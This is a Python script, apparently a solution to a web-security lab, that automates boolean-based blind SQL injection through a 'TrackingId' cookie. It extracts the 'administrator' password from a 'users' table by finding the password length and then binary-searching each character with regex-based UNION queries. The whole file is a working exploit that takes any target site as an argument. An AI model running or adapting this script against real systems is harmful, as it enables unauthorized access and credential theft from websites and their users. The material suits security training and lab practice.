import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time

valid_character_set = '''abcdefghijklmnopqrstuvwxyz0123456789'''

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

def try_query(query):
    """
    Tries a query using the passed in query string.
    Args:
        query (str): The query string used in the query.
    Returns:
        bool: True if the query was successful and the response contains 'Welcome back!', False otherwise.
    """
    #print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    try:
        resp = requests.get(url, cookies=mycookies)
    except requests.exceptions.Timeout or requests.exceptions.ConnectionError: #try again
        try:
            resp = requests.get(url, cookies=mycookies)
        except requests.exceptions as e:
            print(f"An Error Occurred: {e}")
    except requests.exceptions as e:
        print(f"An Error Occurred: {e}")
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

#print(try_query("""x' OR 1=1 --"""))
#print(try_query("""x" OR 1=1 --"""))
    
def find_length():
    """
    Finds the length of the password for 'administrator'.
    Returns:
        int: The length of the password
    """
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        #print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            return num

def find_password(password_length):
    """
    Finds the password for 'administrator' using a brute force approach.
    Args:
        password_length (int): The length of the password found in find_length()
    Returns:
        string: the password found by brute force
    """
    found_password = ""
    for i in range(password_length): #execute the identified password length
        found_password = found_password + binary_search(valid_character_set, found_password)
        print(found_password)

    final_query = f"""x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{found_password}$' -- """
    if try_query(final_query) == True:
        return found_password

def binary_search(charset, current_password):
    """
    Binary search that queries the front half of the charset.
    If the char is in the front half, a recursive call is made on the front.
    If the char is in the back half, a recurisve call is made on the back.
    Args:
        charset (string): the charset currently being searched
        current_password (string): the current password string gathered so far
    Returns:
        the next char is the password string
    """
    if len(charset) == 1:
        return charset
    mid = len(charset)//2
    front_query = try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{current_password}[{charset[:mid]}]' --""")
    if front_query is True: #char is in front
        return binary_search(charset[:mid], current_password)
    else: #char is in back
        return binary_search(charset[mid:], current_password)

def main(): 
    """
    Entry point for the program.
    Starts the timer, finds the length of the password, then brute forces the password.
    Prints out the found password and how long the search took.
    """
    begin_time = time.perf_counter()
    password_length = find_length()
    print(f"Password length is {password_length}")
    password = find_password(password_length)
    print(f'Password found: {password}')
    print(f"Time elapsed is {time.perf_counter()-begin_time}")

if __name__ == '__main__':
    main()